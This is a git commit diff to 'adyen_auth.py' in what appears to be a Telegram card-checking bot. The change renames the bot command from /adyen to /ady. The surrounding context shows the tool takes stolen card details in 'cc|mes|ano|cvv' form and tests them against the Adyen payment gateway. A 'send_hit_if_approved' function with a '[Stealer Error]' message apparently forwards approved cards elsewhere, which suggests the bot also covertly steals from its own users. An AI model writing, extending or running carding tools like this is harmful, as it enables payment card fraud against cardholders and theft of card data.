b6d91c271f060c9c605a9c1de6df4d7b5eb61d66
spxlau <buoyspilux@gmail.com>
2026-04-03 21:53:46 +0300

    Update adyen_auth.py

--- BOT/newgates/adyen_auth.py
+++ BOT/newgates/adyen_auth.py
@@ -22,7 +22,7 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("adyen", [".", "/"]))
+@Client.on_message(filters.command("ady", [".", "/"]))
 async def adyen_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
@@ -37,7 +37,7 @@ async def adyen_auth_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /adyen\n\nMessage: No CC Found in your input ❌\n\nUsage: /adyen cc|mes|ano|cvv</b>"""
+            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /ady\n\nMessage: No CC Found in your input ❌\n\nUsage: /adyen cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
